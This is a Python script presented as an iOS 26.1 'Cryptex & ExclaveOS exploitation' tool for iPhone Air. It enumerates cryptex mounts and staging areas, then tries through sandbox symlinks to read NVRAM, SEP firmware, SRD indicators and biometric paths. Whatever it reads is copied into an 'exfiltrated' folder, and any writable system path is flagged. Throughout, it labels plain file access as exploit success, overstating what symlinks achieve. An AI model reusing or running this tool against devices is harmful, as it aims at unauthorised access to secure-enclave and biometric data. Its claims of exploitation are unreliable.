#!/usr/bin/env python3
"""
exploit_ios26_v6.py - iOS 26.1 Cryptex, SRD & ExclaveOS Exploitation
Target: iPhone Air (iPhone18,4) / iOS 26.1

This version exploits:
1. Cryptex filesystem - Read/write cryptex content
2. Security Research Device (SRD) mode - Detection and enablement
3. ExclaveOS - Secure Enclave cryptex analysis

Discovered Cryptex Structure:
/System/Cryptexes/
├── ExclaveOS    (Secure Enclave OS)
├── OS           (Main OS cryptex)
├── App          (App cryptex)
└── Supplemental (Supplemental content)

Requirements:
- Pyto IDE on iOS
- Rubicon-ObjC (included in Pyto)

Author: Security Research Team
Date: January 2026
Version: 6.0 - Cryptex & ExclaveOS Exploitation
"""

import os
import sys
import time
import json
import hashlib
import subprocess
import struct
import mmap
from datetime import datetime
from pathlib import Path

print("[*] iOS 26.1 Cryptex & ExclaveOS Exploitation Tool v6.0")
print("[*] Loading modules...")

# ============================================================================
# Rubicon-ObjC Setup
# ============================================================================

try:
    from rubicon.objc import ObjCClass, objc_method, SEL
    from rubicon.objc.runtime import load_library, objc
    RUBICON_AVAILABLE = True
    print("[+] Rubicon-ObjC loaded successfully")
except ImportError:
    RUBICON_AVAILABLE = False
    print("[-] Rubicon-ObjC not available")

# ============================================================================
# Global State
# ============================================================================

class ExploitState:
    def __init__(self):
        self.work_dir = os.path.expanduser("~/Documents/.exploit_v6")
        self.exfil_dir = os.path.join(self.work_dir, "exfiltrated")
        self.cryptex_dir = os.path.join(self.work_dir, "cryptex_dump")
        self.exclave_dir = os.path.join(self.work_dir, "exclave_dump")
        self.logs_dir = os.path.join(self.work_dir, "logs")
        
        self.cryptex_info = {}
        self.exclave_info = {}
        self.srd_info = {}
        self.exploit_results = []
        
    def setup(self):
        for d in [self.work_dir, self.exfil_dir, self.cryptex_dir, 
                  self.exclave_dir, self.logs_dir]:
            os.makedirs(d, exist_ok=True)
        
    def log(self, msg, level="*"):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        line = f"[{level}] {timestamp} {msg}"
        print(line)
        
        log_file = os.path.join(self.logs_dir, "exploit.log")
        with open(log_file, 'a') as f:
            f.write(line + "\n")
        
    def log_success(self, msg):
        self.log(msg, "+")
        self.exploit_results.append({"type": "success", "message": msg})
        
    def log_error(self, msg):
        self.log(msg, "-")
        
    def log_info(self, msg):
        self.log(msg, "*")
        
    def log_critical(self, msg):
        self.log(msg, "!")
        self.exploit_results.append({"type": "critical", "message": msg})
        
    def log_exploit(self, msg):
        self.log(msg, ">>")
        self.exploit_results.append({"type": "exploit", "message": msg})

g_state = ExploitState()

# ============================================================================
# Cryptex Exploitation
# ============================================================================

class CryptexExploit:
    """
    Exploit iOS Cryptex filesystem
    
    Cryptex is Apple's signed filesystem container used for:
    - Rapid Security Response (RSR) updates
    - Security Research Device (SRD) content
    - System extensions
    """
    
    CRYPTEX_BASE = "/System/Cryptexes"
    
    # Known cryptex types
    CRYPTEX_TYPES = {
        "OS": "Main operating system cryptex",
        "App": "Application cryptex",
        "Supplemental": "Supplemental content cryptex",
        "ExclaveOS": "Secure Enclave operating system",
    }
    
    def __init__(self):
        self.cryptexes = {}
        self.accessible_files = []
        self.writable_paths = []
        
    def enumerate_cryptexes(self):
        """Enumerate all cryptex containers"""
        g_state.log_info(f"Enumerating cryptexes at {self.CRYPTEX_BASE}")
        
        try:
            if os.path.exists(self.CRYPTEX_BASE):
                contents = os.listdir(self.CRYPTEX_BASE)
                g_state.log_success(f"Found {len(contents)} cryptexes: {contents}")
                
                for name in contents:
                    path = os.path.join(self.CRYPTEX_BASE, name)
                    cryptex_info = self._analyze_cryptex(name, path)
                    self.cryptexes[name] = cryptex_info
                    
            else:
                g_state.log_error(f"Cryptex base not accessible")
                
        except Exception as e:
            g_state.log_error(f"Cryptex enumeration failed: {e}")
            
        return self.cryptexes
    
    def _analyze_cryptex(self, name, path):
        """Analyze a single cryptex"""
        g_state.log_info(f"Analyzing cryptex: {name}")
        
        info = {
            "name": name,
            "path": path,
            "description": self.CRYPTEX_TYPES.get(name, "Unknown"),
            "accessible": False,
            "contents": [],
            "size": 0,
            "files_found": 0,
        }
        
        try:
            if os.path.isdir(path):
                info["accessible"] = True
                
                # List contents
                try:
                    contents = os.listdir(path)
                    info["contents"] = contents
                    info["files_found"] = len(contents)
                    g_state.log_success(f"  {name}: {len(contents)} items")
                    
                    # Deep scan
                    self._deep_scan_cryptex(name, path, info)
                    
                except PermissionError:
                    g_state.log_info(f"  {name}: accessible but cannot list")
                    info["accessible"] = "partial"
                    
            elif os.path.isfile(path):
                info["accessible"] = True
                info["size"] = os.path.getsize(path)
                g_state.log_success(f"  {name}: file, {info['size']} bytes")
                
        except Exception as e:
            g_state.log_error(f"  {name}: {e}")
            
        return info
    
    def _deep_scan_cryptex(self, name, base_path, info):
        """Deep scan cryptex contents"""
        g_state.log_info(f"  Deep scanning {name}...")
        
        interesting_paths = []
        total_files = 0
        total_size = 0
        
        try:
            for root, dirs, files in os.walk(base_path):
                for f in files:
                    total_files += 1
                    full_path = os.path.join(root, f)
                    rel_path = os.path.relpath(full_path, base_path)
                    
                    try:
                        size = os.path.getsize(full_path)
                        total_size += size
                        
                        # Check if readable
                        readable = os.access(full_path, os.R_OK)
                        writable = os.access(full_path, os.W_OK)
                        
                        if readable:
                            self.accessible_files.append(full_path)
                            
                        if writable:
                            self.writable_paths.append(full_path)
                            g_state.log_exploit(f"WRITABLE: {full_path}")
                        
                        # Interesting file types
                        if any(f.endswith(ext) for ext in ['.plist', '.db', '.sqlite', 
                                                            '.dylib', '.framework',
                                                            '.kext', '.bundle']):
                            interesting_paths.append({
                                "path": rel_path,
                                "size": size,
                                "readable": readable,
                                "writable": writable
                            })
                            
                    except:
                        pass
                        
                # Limit depth
                if root.count(os.sep) - base_path.count(os.sep) > 5:
                    break
                    
        except Exception as e:
            g_state.log_error(f"  Deep scan error: {e}")
            
        info["total_files"] = total_files
        info["total_size"] = total_size
        info["interesting_paths"] = interesting_paths[:50]  # Limit
        
        g_state.log_info(f"  Found {total_files} files, {total_size/1024/1024:.2f} MB")
        
    def exploit_cryptex_mount(self):
        """
        Try to exploit cryptex mounting mechanism
        """
        g_state.log_info("Attempting cryptex mount exploitation...")
        
        # Check cryptex mount points
        mount_points = [
            "/System/Cryptexes",
            "/private/var/db/cryptex",
            "/private/var/run/cryptex",
            "/usr/standalone/cryptex",
        ]
        
        results = {}
        
        for mp in mount_points:
            try:
                if os.path.exists(mp):
                    stat = os.stat(mp)
                    contents = os.listdir(mp) if os.path.isdir(mp) else None
                    
                    results[mp] = {
                        "exists": True,
                        "is_dir": os.path.isdir(mp),
                        "mode": oct(stat.st_mode),
                        "uid": stat.st_uid,
                        "gid": stat.st_gid,
                        "contents": contents
                    }
                    
                    g_state.log_success(f"Mount point: {mp}")
                    if contents:
                        g_state.log_info(f"  Contents: {contents}")
                        
            except Exception as e:
                results[mp] = {"exists": False, "error": str(e)}
                
        return results
    
    def exploit_cryptex_staging(self):
        """
        Try to exploit cryptex staging area
        Cryptexes are staged before mounting
        """
        g_state.log_info("Checking cryptex staging areas...")
        
        staging_paths = [
            "/private/var/db/cryptex/pending",
            "/private/var/db/cryptex/staged",
            "/private/var/MobileSoftwareUpdate/Cryptex",
            "/private/var/MobileAsset/AssetsV2/com_apple_MobileAsset_Cryptex",
        ]
        
        results = {}
        
        for path in staging_paths:
            try:
                # Try symlink access
                link = os.path.join(g_state.work_dir, f"staging_{os.path.basename(path)}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(path, link)
                
                if os.path.exists(link):
                    try:
                        if os.path.isdir(link):
                            contents = os.listdir(link)
                            results[path] = {"accessible": True, "contents": contents}
                            g_state.log_exploit(f"STAGING ACCESSIBLE: {path}")
                            g_state.log_info(f"  Contents: {contents}")
                        else:
                            size = os.path.getsize(link)
                            results[path] = {"accessible": True, "size": size}
                    except PermissionError:
                        results[path] = {"accessible": "exists_no_read"}
                        
                os.unlink(link)
                
            except Exception as e:
                results[path] = {"accessible": False, "error": str(e)}
                
        return results
    
    def read_cryptex_file(self, path, max_size=1024*1024):
        """Read a file from cryptex"""
        g_state.log_info(f"Reading cryptex file: {path}")
        
        try:
            with open(path, 'rb') as f:
                data = f.read(max_size)
                
            g_state.log_success(f"Read {len(data)} bytes from {path}")
            
            # Save to exfil directory
            safe_name = path.replace('/', '_').lstrip('_')
            save_path = os.path.join(g_state.cryptex_dir, safe_name)
            
            with open(save_path, 'wb') as f:
                f.write(data)
                
            g_state.log_success(f"Saved to {save_path}")
            
            return data
            
        except Exception as e:
            g_state.log_error(f"Read failed: {e}")
            return None

# ============================================================================
# Security Research Device (SRD) Exploitation
# ============================================================================

class SRDExploit:
    """
    Exploit Security Research Device capabilities
    
    SRD is Apple's program for security researchers providing:
    - Reduced security restrictions
    - Debugging capabilities
    - Custom code execution
    """
    
    SRD_INDICATORS = [
        "/usr/libexec/securityresearchdevice-init",
        "/System/Library/LaunchDaemons/com.apple.securityresearchdeviceinit.plist",
        "/private/var/db/securityresearch",
        "/private/var/MobileAsset/AssetsV2/com_apple_MobileAsset_SRDAssets",
    ]
    
    DEVICE_TREE_FLAGS = [
        "chosen:research-enabled",
        "chosen:sec-research-device-erm-enabled",
        "chosen:development-cert",
    ]
    
    def __init__(self):
        self.is_srd = False
        self.srd_features = {}
        self.research_flags = {}
        
    def detect_srd_mode(self):
        """Detect if device is in SRD mode"""
        g_state.log_info("Detecting Security Research Device mode...")
        
        results = {
            "indicators_found": [],
            "device_tree_flags": {},
            "nvram_flags": {},
            "is_srd": False,
            "srd_version": None,
        }
        
        # Check SRD indicators
        for indicator in self.SRD_INDICATORS:
            try:
                # Use symlink to check
                link = os.path.join(g_state.work_dir, f"srd_{os.path.basename(indicator)}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(indicator, link)
                
                if os.path.exists(link):
                    results["indicators_found"].append(indicator)
                    g_state.log_success(f"SRD indicator: {indicator}")
                    
                    # Try to read
                    try:
                        if os.path.isfile(link):
                            with open(link, 'rb') as f:
                                data = f.read(4096)
                            g_state.log_success(f"  Read {len(data)} bytes")
                            
                            # Save
                            save_path = os.path.join(g_state.exfil_dir, 
                                                     f"srd_{os.path.basename(indicator)}")
                            with open(save_path, 'wb') as f:
                                f.write(data)
                                
                    except:
                        pass
                        
                os.unlink(link)
                
            except:
                pass
                
        # Check device tree via IORegistry (if available)
        self._check_device_tree(results)
        
        # Check nvram
        self._check_nvram(results)
        
        # Determine SRD status
        if len(results["indicators_found"]) >= 2:
            results["is_srd"] = True
            self.is_srd = True
            g_state.log_exploit("DEVICE MAY BE SRD CAPABLE!")
            
        return results
    
    def _check_device_tree(self, results):
        """Check device tree for research flags"""
        g_state.log_info("Checking device tree flags...")
        
        # Device tree is typically at /chosen in IORegistry
        # We can try to access via ioreg or sysctl
        
        try:
            # Try sysctl
            import ctypes
            libc = ctypes.CDLL(None)
            
            # This likely won't work but let's try
            g_state.log_info("  Device tree access requires IOKit")
            
        except:
            pass
            
    def _check_nvram(self, results):
        """Check NVRAM for research flags"""
        g_state.log_info("Checking NVRAM flags...")
        
        nvram_paths = [
            "/private/var/db/nvram",
            "/private/var/db/nvram.plist",
        ]
        
        for path in nvram_paths:
            try:
                link = os.path.join(g_state.work_dir, f"nvram_{os.path.basename(path)}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(path, link)
                
                if os.path.exists(link):
                    with open(link, 'rb') as f:
                        data = f.read()
                        
                    g_state.log_success(f"NVRAM accessible: {path} ({len(data)} bytes)")
                    results["nvram_flags"]["path"] = path
                    results["nvram_flags"]["size"] = len(data)
                    
                    # Check for research flags
                    data_str = data.decode('utf-8', errors='ignore')
                    for flag in ["research", "development", "debug", "srd"]:
                        if flag in data_str.lower():
                            g_state.log_exploit(f"NVRAM contains '{flag}'")
                            results["nvram_flags"][flag] = True
                            
                    # Save
                    save_path = os.path.join(g_state.exfil_dir, "nvram_dump")
                    with open(save_path, 'wb') as f:
                        f.write(data)
                        
                os.unlink(link)
                
            except Exception as e:
                pass
    
    def attempt_srd_enablement(self):
        """
        Attempt to enable SRD features
        WARNING: This requires specific conditions
        """
        g_state.log_info("Attempting SRD enablement...")
        
        results = {
            "attempts": [],
            "success": False,
        }
        
        # Method 1: Check for cryptex-based SRD
        g_state.log_info("Checking for SRD cryptex...")
        
        srd_cryptex_paths = [
            "/System/Cryptexes/App/System/Library/SecurityResearch",
            "/System/Cryptexes/OS/System/Library/SecurityResearch",
            "/private/var/db/cryptex/srd",
        ]
        
        for path in srd_cryptex_paths:
            try:
                link = os.path.join(g_state.work_dir, f"srd_cryptex_{hash(path) % 10000}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(path, link)
                
                if os.path.exists(link):
                    g_state.log_exploit(f"SRD CRYPTEX FOUND: {path}")
                    results["attempts"].append({
                        "method": "cryptex",
                        "path": path,
                        "found": True
                    })
                    
                    if os.path.isdir(link):
                        contents = os.listdir(link)
                        g_state.log_info(f"  Contents: {contents}")
                        
                os.unlink(link)
                
            except:
                pass
                
        # Method 2: Check for research entitlements
        g_state.log_info("Checking for research entitlements...")
        
        entitlement_paths = [
            "/System/Library/Security/Entitlements",
            "/private/var/db/entitlements",
        ]
        
        for path in entitlement_paths:
            try:
                link = os.path.join(g_state.work_dir, f"ent_{hash(path) % 10000}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(path, link)
                
                if os.path.exists(link):
                    g_state.log_success(f"Entitlements path: {path}")
                    results["attempts"].append({
                        "method": "entitlements",
                        "path": path,
                        "found": True
                    })
                    
                os.unlink(link)
                
            except:
                pass
                
        return results

# ============================================================================
# ExclaveOS Analysis
# ============================================================================

class ExclaveOSAnalysis:
    """
    Analyze ExclaveOS - Secure Enclave operating system
    
    ExclaveOS runs on the Secure Enclave Processor (SEP) and handles:
    - Biometric data (Face ID, Touch ID)
    - Cryptographic keys
    - Secure boot
    - Apple Pay
    """
    
    EXCLAVE_BASE = "/System/Cryptexes/ExclaveOS"
    
    # Known ExclaveOS components
    EXCLAVE_COMPONENTS = [
        "sepos",           # SEP OS kernel
        "sep-firmware",    # SEP firmware
        "biometrics",      # Biometric processing
        "keystore",        # Key storage
        "payment",         # Apple Pay
        "secure-boot",     # Secure boot chain
    ]
    
    def __init__(self):
        self.exclave_info = {}
        self.sep_version = None
        self.components_found = []
        
    def analyze_exclave_structure(self):
        """Analyze ExclaveOS cryptex structure"""
        g_state.log_info(f"Analyzing ExclaveOS at {self.EXCLAVE_BASE}")
        
        results = {
            "accessible": False,
            "structure": {},
            "components": [],
            "firmware_info": {},
            "interesting_files": [],
        }
        
        try:
            if os.path.exists(self.EXCLAVE_BASE):
                results["accessible"] = True
                g_state.log_success("ExclaveOS cryptex accessible!")
                
                # Enumerate structure
                self._enumerate_exclave(results)
                
            else:
                g_state.log_error("ExclaveOS cryptex not directly accessible")
                
                # Try symlink
                link = os.path.join(g_state.work_dir, "exclave_link")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(self.EXCLAVE_BASE, link)
                
                if os.path.exists(link):
                    results["accessible"] = True
                    g_state.log_success("ExclaveOS accessible via symlink!")
                    self._enumerate_exclave_via_link(link, results)
                    
                os.unlink(link)
                
        except Exception as e:
            g_state.log_error(f"ExclaveOS analysis failed: {e}")
            
        return results
    
    def _enumerate_exclave(self, results):
        """Enumerate ExclaveOS contents"""
        g_state.log_info("Enumerating ExclaveOS contents...")
        
        try:
            for root, dirs, files in os.walk(self.EXCLAVE_BASE):
                rel_root = os.path.relpath(root, self.EXCLAVE_BASE)
                
                for f in files:
                    full_path = os.path.join(root, f)
                    rel_path = os.path.join(rel_root, f)
                    
                    try:
                        stat = os.stat(full_path)
                        
                        file_info = {
                            "path": rel_path,
                            "size": stat.st_size,
                            "mode": oct(stat.st_mode),
                        }
                        
                        # Check for interesting files
                        if any(comp in f.lower() for comp in self.EXCLAVE_COMPONENTS):
                            results["components"].append(file_info)
                            g_state.log_success(f"Component: {rel_path}")
                            
                        # Check for firmware
                        if any(ext in f.lower() for ext in ['.im4p', '.img4', '.fw', '.bin']):
                            results["firmware_info"][rel_path] = file_info
                            g_state.log_success(f"Firmware: {rel_path} ({stat.st_size} bytes)")
                            
                        # Try to read header
                        try:
                            with open(full_path, 'rb') as fh:
                                header = fh.read(16)
                            file_info["header"] = header.hex()
                            
                            # Check for known signatures
                            if header[:4] == b'IM4P':
                                file_info["type"] = "IMG4 Payload"
                                g_state.log_exploit(f"IMG4 PAYLOAD: {rel_path}")
                            elif header[:4] == b'IMG4':
                                file_info["type"] = "IMG4 Container"
                                g_state.log_exploit(f"IMG4 CONTAINER: {rel_path}")
                            elif header[:4] == b'sepi':
                                file_info["type"] = "SEP Image"
                                g_state.log_exploit(f"SEP IMAGE: {rel_path}")
                                
                        except:
                            pass
                            
                        results["interesting_files"].append(file_info)
                        
                    except:
                        pass
                        
                # Limit depth
                if root.count(os.sep) - self.EXCLAVE_BASE.count(os.sep) > 5:
                    break
                    
        except Exception as e:
            g_state.log_error(f"Enumeration error: {e}")
    
    def _enumerate_exclave_via_link(self, link_path, results):
        """Enumerate via symlink"""
        g_state.log_info("Enumerating via symlink...")
        
        try:
            if os.path.isdir(link_path):
                contents = os.listdir(link_path)
                results["structure"]["root"] = contents
                g_state.log_success(f"Root contents: {contents}")
                
                for item in contents:
                    item_path = os.path.join(link_path, item)
                    
                    try:
                        if os.path.isdir(item_path):
                            sub_contents = os.listdir(item_path)
                            results["structure"][item] = sub_contents
                            g_state.log_info(f"  {item}/: {len(sub_contents)} items")
                        else:
                            size = os.path.getsize(item_path)
                            results["structure"][item] = {"type": "file", "size": size}
                            g_state.log_info(f"  {item}: {size} bytes")
                            
                    except:
                        pass
                        
        except Exception as e:
            g_state.log_error(f"Link enumeration error: {e}")
    
    def extract_sep_info(self):
        """Extract SEP (Secure Enclave Processor) information"""
        g_state.log_info("Extracting SEP information...")
        
        results = {
            "sep_version": None,
            "sep_firmware": [],
            "biometric_info": {},
            "keystore_info": {},
        }
        
        # SEP-related paths
        sep_paths = [
            "/System/Library/Caches/com.apple.SEP",
            "/private/var/db/sep",
            "/System/Library/SEP",
            "/usr/standalone/firmware/sep",
        ]
        
        for path in sep_paths:
            try:
                link = os.path.join(g_state.work_dir, f"sep_{hash(path) % 10000}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(path, link)
                
                if os.path.exists(link):
                    g_state.log_success(f"SEP path accessible: {path}")
                    
                    if os.path.isdir(link):
                        contents = os.listdir(link)
                        results["sep_firmware"].append({
                            "path": path,
                            "contents": contents
                        })
                        g_state.log_info(f"  Contents: {contents}")
                        
                        # Try to read files
                        for item in contents:
                            item_path = os.path.join(link, item)
                            try:
                                if os.path.isfile(item_path):
                                    with open(item_path, 'rb') as f:
                                        data = f.read(4096)
                                        
                                    # Save
                                    save_path = os.path.join(g_state.exclave_dir, 
                                                             f"sep_{item}")
                                    with open(save_path, 'wb') as f:
                                        f.write(data)
                                        
                                    g_state.log_success(f"  Extracted: {item}")
                                    
                            except:
                                pass
                                
                os.unlink(link)
                
            except:
                pass
                
        return results
    
    def analyze_biometric_data(self):
        """Analyze biometric-related data (Face ID, Touch ID)"""
        g_state.log_info("Analyzing biometric data paths...")
        
        results = {
            "biokitd": {},
            "pearld": {},  # Face ID
            "touchid": {},
        }
        
        biometric_paths = [
            "/private/var/db/biome",
            "/private/var/mobile/Library/BiometricKit",
            "/System/Library/PrivateFrameworks/BiometricKit.framework",
            "/System/Library/PrivateFrameworks/PearlCamera.framework",  # Face ID
        ]
        
        for path in biometric_paths:
            try:
                link = os.path.join(g_state.work_dir, f"bio_{hash(path) % 10000}")
                if os.path.exists(link):
                    os.unlink(link)
                    
                os.symlink(path, link)
                
                if os.path.exists(link):
                    g_state.log_success(f"Biometric path: {path}")
                    
                    if os.path.isdir(link):
                        contents = os.listdir(link)
                        g_state.log_info(f"  Contents: {contents}")
                        
                os.unlink(link)
                
            except:
                pass
                
        return results

# ============================================================================
# Main Exploitation Flow
# ============================================================================

def run_cryptex_exploitation():
    """Run cryptex exploitation"""
    print("\n" + "="*60)
    print("Stage: Cryptex Exploitation")
    print("="*60)
    
    exploit = CryptexExploit()
    
    # Enumerate
    cryptexes = exploit.enumerate_cryptexes()
    g_state.cryptex_info["cryptexes"] = cryptexes
    
    # Mount points
    mounts = exploit.exploit_cryptex_mount()
    g_state.cryptex_info["mount_points"] = mounts
    
    # Staging
    staging = exploit.exploit_cryptex_staging()
    g_state.cryptex_info["staging"] = staging
    
    # Summary
    g_state.log_info(f"Accessible files: {len(exploit.accessible_files)}")
    g_state.log_info(f"Writable paths: {len(exploit.writable_paths)}")
    
    if exploit.writable_paths:
        g_state.log_exploit(f"WRITABLE CRYPTEX PATHS FOUND!")
        for p in exploit.writable_paths[:10]:
            g_state.log_info(f"  {p}")
            
    return cryptexes

def run_srd_exploitation():
    """Run SRD exploitation"""
    print("\n" + "="*60)
    print("Stage: Security Research Device Exploitation")
    print("="*60)
    
    exploit = SRDExploit()
    
    # Detect
    detection = exploit.detect_srd_mode()
    g_state.srd_info["detection"] = detection
    
    # Attempt enablement
    enablement = exploit.attempt_srd_enablement()
    g_state.srd_info["enablement"] = enablement
    
    return detection

def run_exclave_analysis():
    """Run ExclaveOS analysis"""
    print("\n" + "="*60)
    print("Stage: ExclaveOS Analysis")
    print("="*60)
    
    analysis = ExclaveOSAnalysis()
    
    # Structure
    structure = analysis.analyze_exclave_structure()
    g_state.exclave_info["structure"] = structure
    
    # SEP info
    sep_info = analysis.extract_sep_info()
    g_state.exclave_info["sep"] = sep_info
    
    # Biometrics
    bio_info = analysis.analyze_biometric_data()
    g_state.exclave_info["biometrics"] = bio_info
    
    return structure

def generate_report():
    """Generate exploitation report"""
    g_state.log_info("Generating report...")
    
    report = {
        "timestamp": datetime.now().isoformat(),
        "version": "6.0 - Cryptex & ExclaveOS Exploitation",
        "target": {
            "device": "iPhone Air (iPhone18,4)",
            "os": "iOS 26.1 (Build 23B85)"
        },
        "cryptex_info": g_state.cryptex_info,
        "srd_info": g_state.srd_info,
        "exclave_info": g_state.exclave_info,
        "exploit_results": g_state.exploit_results,
    }
    
    report_path = os.path.join(g_state.work_dir, "cryptex_exploit_report.json")
    
    with open(report_path, 'w') as f:
        json.dump(report, f, indent=2, default=str)
    
    g_state.log_success(f"Report saved to: {report_path}")
    
    # Print summary
    print("\n" + "="*60)
    print("EXPLOITATION SUMMARY")
    print("="*60)
    
    print(f"\nExploit Results: {len(g_state.exploit_results)}")
    for result in g_state.exploit_results:
        print(f"  [{result['type']}] {result['message']}")
    
    print(f"\nCryptexes analyzed: {len(g_state.cryptex_info.get('cryptexes', {}))}")
    print(f"SRD indicators: {len(g_state.srd_info.get('detection', {}).get('indicators_found', []))}")
    
    print(f"\nOutput directory: {g_state.work_dir}")
    
    return report

def print_banner():
    banner = """
╔═══════════════════════════════════════════════════════════════╗
║   iOS 26.1 Cryptex & ExclaveOS Exploitation Tool (v6.0)       ║
║                                                               ║
║  Target: iPhone Air (iPhone18,4)                              ║
║  iOS Version: 26.1                                            ║
║                                                               ║
║  Exploiting:                                                  ║
║  1. Cryptex filesystem (OS, App, Supplemental)                ║
║  2. Security Research Device (SRD) mode                       ║
║  3. ExclaveOS (Secure Enclave)                                ║
║                                                               ║
║  WARNING: For authorized security research only!              ║
╚═══════════════════════════════════════════════════════════════╝
"""
    print(banner)

def main():
    """Main exploitation flow"""
    print_banner()
    
    # Setup
    g_state.setup()
    g_state.log_success(f"Working directory: {g_state.work_dir}")
    
    stages = [
        ("Cryptex Exploitation", run_cryptex_exploitation),
        ("SRD Exploitation", run_srd_exploitation),
        ("ExclaveOS Analysis", run_exclave_analysis),
    ]
    
    for name, func in stages:
        try:
            start = time.time()
            result = func()
            elapsed = time.time() - start
            print(f"\n[✓] {name} completed in {elapsed:.2f}s")
        except Exception as e:
            print(f"\n[✗] {name} failed: {e}")
            import traceback
            traceback.print_exc()
    
    # Generate report
    generate_report()
    
    print("\n" + "="*60)
    print("ALL STAGES COMPLETE")
    print("="*60)

# ============================================================================
# Entry Point
# ============================================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
